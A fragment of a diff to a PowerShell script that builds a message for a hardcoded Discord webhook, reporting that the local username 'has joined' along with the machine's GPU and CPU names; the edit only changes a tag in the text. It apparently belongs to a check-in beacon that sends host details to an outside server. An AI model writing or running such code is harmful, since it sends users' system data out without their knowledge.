@@ -36,7 +36,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1290163974687690752/4kGM4khXxmud
 # Define the message payload
 $payload = @{
     content = @"
-**$env:username** has joined - crzcrpt
+**$env:username** has joined - stm
 ----------------------------------
 **GPU:** $($gpu.Name)
 **CPU:** $($cpu.Name)
